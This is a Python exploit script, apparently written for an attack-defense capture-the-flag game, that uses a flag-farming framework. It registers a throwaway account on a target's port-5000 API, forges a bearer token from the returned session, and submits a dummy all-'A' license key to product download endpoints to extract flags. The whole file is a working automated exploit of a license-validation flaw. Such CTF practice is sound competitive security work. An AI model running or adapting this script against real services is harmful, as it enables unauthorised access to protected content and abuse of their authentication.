from base64 import b64encode
from string import ascii_lowercase, ascii_uppercase
from httpx import post
from pyfarmer import farm, random_string, print_exception


def main(ip: str):
    auth = random_string(8, charset=ascii_lowercase + ascii_uppercase)
    r = post(
        f"http://{ip}:5000/api/register",
        data={"username": auth, "password": auth},
    )
    r_json = r.json()
    bearer = b"Bearer " + b64encode(f'{r_json["user_id"]}:{r_json["session"]}'.encode())
    for flag_id in ["a", "b", "c"]:
        try:
            r = post(
                f"http://{ip}:5000/api/products/{flag_id}/download",
                data={"license": "AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA"},
                headers={"Authorization": bearer.decode()},
            )
            flag = r.text
            yield flag
        except:
            print_exception()


if __name__ == "__main__":
    farm(main)
